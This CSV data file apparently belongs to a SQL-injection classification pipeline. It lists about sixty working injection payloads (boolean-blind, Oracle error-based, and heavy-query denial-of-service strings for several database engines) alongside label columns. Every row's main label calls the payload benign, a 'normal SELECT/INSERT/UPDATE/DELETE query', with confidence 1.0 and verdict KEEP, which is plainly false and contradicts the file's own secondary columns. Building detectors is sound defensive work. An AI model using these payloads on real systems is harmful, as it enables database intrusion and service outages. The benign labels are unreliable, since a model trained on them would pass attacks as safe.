payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1%' and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and '%' = '",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2460,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%' and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and '%' = '"
-7772' ) ) or 9323 = 9323#,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2461,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-7772' ) ) or 9323 = 9323#
"iif ( 5571 = 4947,1,1/0 )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2462,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"iif ( 5571 = 4947,1,1/0 )"
"-4462%"" ) or 8571 = 8571--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2463,boolean_blind,generic,Pattern match: 'or 8571 = 8571' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-4462%"" ) or 8571 = 8571--"
"1' ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'skdy' = 'skdy",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2464,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'skdy' = 'skdy"
select ( case when ( 4341 = 7041 ) then 4341 else 4341* ( select 4341 from mysql.db ) end ) #,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2465,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 4341 = 7041 ) then 4341 else 4341* ( select 4341 from mysql.db ) end ) #
"-2625' ) or elt ( 1032 = 1032,3623 ) and ( 'eliy' = 'eliy",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2466,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-2625' ) or elt ( 1032 = 1032,3623 ) and ( 'eliy' = 'eliy"
"1"" ) where 2278 = 2278",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2467,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) where 2278 = 2278"
"1 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) # hlrg",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2468,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"1 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) # hlrg"
"select * from generate_series ( 9167,9167,case when ( 9167 = 2273 ) then 1 else 0 end ) limit 1--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2469,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal,"select * from generate_series ( 9167,9167,case when ( 9167 = 2273 ) then 1 else 0 end ) limit 1--"
-2527 ) ) as oqpy where 7468 = 7468 or 3038 = 3038,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2470,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-2527 ) ) as oqpy where 7468 = 7468 or 3038 = 3038
"1'+ ( select 'mikf' where 5814 = 5814 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2471,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1'+ ( select 'mikf' where 5814 = 5814 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
"1"" where 5039 = 5039 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2472,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" where 5039 = 5039 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
1' ) where 9516 = 9516,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2473,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 9516 = 9516
1'|| ( select 'adni' from dual where 6611 = 6611,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2474,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,1'|| ( select 'adni' from dual where 6611 = 6611
1 ) ) as wajy where 8593 = 8593,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2475,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) as wajy where 8593 = 8593
-8404 ) ) order by 1--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2476,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,-8404 ) ) order by 1--
"-2759%"" ) ) or 7769 = 1249#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2477,boolean_blind,generic,Pattern match: 'or 7769 = 1249' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-2759%"" ) ) or 7769 = 1249#"
"( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2478,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )"
"1' where 1628 = 1628 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2479,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' where 1628 = 1628 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
"-4822"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""owbp"" = ""owbp",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2480,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"-4822"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""owbp"" = ""owbp"
1' ) where 2974 = 2974 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2481,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,1' ) where 2974 = 2974 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 1321 = 1321",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2482,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 1321 = 1321"
1' ) as sagj where 4558 = 4558,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2483,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) as sagj where 4558 = 4558
"1%' ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( '%' = '",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2484,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%' ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( '%' = '"
"-1993%"" ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2485,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"-1993%"" ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ""%"" = """
"1 ) as ihan where 5298 = 5298 and elt ( 6587 = 3479,3479 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2486,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1 ) as ihan where 5298 = 5298 and elt ( 6587 = 3479,3479 ) --"
-5356' ) or 9323 = 9323#,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2487,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-5356' ) or 9323 = 9323#
"1 ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2488,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
"1' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and 'yaje' = 'yaje",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2489,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and 'yaje' = 'yaje"
-8370' ) ) or ( 3501 = 6407 ) *6407 and ( ( 'agcm' like 'agcm,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2490,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-8370' ) ) or ( 3501 = 6407 ) *6407 and ( ( 'agcm' like 'agcm
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( ""uydm"" = ""uydm",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2491,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( ""uydm"" = ""uydm"
"1'+ ( select uzan where 4312 = 4312 and make_set ( 3129 = 9555,9555 ) ) +'",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2492,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1'+ ( select uzan where 4312 = 4312 and make_set ( 3129 = 9555,9555 ) ) +'"
"-9749"" where 7083 = 7083 or make_set ( 7577 = 1182,1182 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2493,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-9749"" where 7083 = 7083 or make_set ( 7577 = 1182,1182 ) --"
1%' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( '%' = ',benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2494,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1%' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( '%' = '
"-1050"" ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""orfo"" like ""orfo",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2495,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"-1050"" ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""orfo"" like ""orfo"
1' ) where 3893 = 3893,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2496,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 3893 = 3893
"1 ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2497,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )"
"1' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'xkxi' like 'xkxi",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2498,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'xkxi' like 'xkxi"
"1 ) ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2499,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 ) ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
"1' and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and 'tfso' = 'tfso",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2500,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and 'tfso' = 'tfso"
"1 and elt ( 4249 = 4249,7259 ) # lwyo",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2501,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1 and elt ( 4249 = 4249,7259 ) # lwyo"
"1"" ) as semi where 4260 = 4260",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2502,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as semi where 4260 = 4260"
1' ) ) as qswu where 6377 = 6377,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2503,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as qswu where 6377 = 6377
"1%"" ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2504,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1%"" ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""%"" = """
"-9496 ) ) ) or elt ( 7511 = 3951,3951 ) and ( ( ( 3514 = 3514",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2505,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-9496 ) ) ) or elt ( 7511 = 3951,3951 ) and ( ( ( 3514 = 3514"
"-8686"" where 4532 = 4532 or elt ( 3301 = 9065,9065 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2506,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"-8686"" where 4532 = 4532 or elt ( 3301 = 9065,9065 ) --"
"1"" ) where 8254 = 8254 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2507,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" ) where 8254 = 8254 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
"1 ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2508,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
select case when 5894 = 4052 then 1 else null end--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2509,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 5894 = 4052 then 1 else null end--
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( 4537 = 4537",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2510,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( 4537 = 4537"
"1%"" ) and make_set ( 9956 = 1060,1060 ) and ( ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2511,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1%"" ) and make_set ( 9956 = 1060,1060 ) and ( ""%"" = """
1%' ) and ( 3020 = 3020 ) *6703 and ( '%' = ',benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2512,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1%' ) and ( 3020 = 3020 ) *6703 and ( '%' = '
"1' ) where 1625 = 1625 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2513,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1' ) where 1625 = 1625 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --"
1%' rlike ( select ( case when ( 3596 = 4245 ) then 1 else 0x28 end ) ) and '%' = ',benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2514,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1%' rlike ( select ( case when ( 3596 = 4245 ) then 1 else 0x28 end ) ) and '%' = '
"1' ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2515,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --"
1 ) where 8041 = 8041,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2516,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) where 8041 = 8041
1 ) as sglv where 7676 = 7676,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2517,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as sglv where 7676 = 7676
"1' where 9241 = 9241 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2518,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' where 9241 = 9241 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
"1 ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 2939 = 2939",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2519,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1 ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 2939 = 2939"
"1"" ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""nthu"" like ""nthu",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2520,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""nthu"" like ""nthu"
